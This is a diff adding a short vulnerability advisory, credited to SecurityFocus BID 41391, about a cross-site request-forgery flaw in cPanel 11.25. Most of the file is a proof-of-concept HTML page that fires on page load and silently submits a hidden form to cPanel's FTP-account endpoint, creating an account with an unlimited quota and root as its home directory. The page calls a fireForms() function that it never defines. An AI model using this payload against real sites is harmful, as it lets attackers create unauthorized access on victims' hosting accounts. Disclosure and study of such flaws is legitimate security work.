@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/41391/info
+
+cPanel is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain administrative actions. This may lead to further attacks.
+
+cPanel 11.25 is vulnerable; other versions may also be affected.
+
+<html>
+<body onload="javascript:fireForms()">
+<form method="POST" name="form0" action="
+http://www.example.com/frontend/x3/ftp/doaddftp.html">
+<input type="hidden" name="login" value="name"/>
+<input type="hidden" name="password" value="pass"/>
+<input type="hidden" name="password2" value="pass"/>
+<input type="hidden" name="homedir" value="/"/>
+<input type="hidden" name="quota" value="unlimited"/>
+</form>
+</body>
+</html>
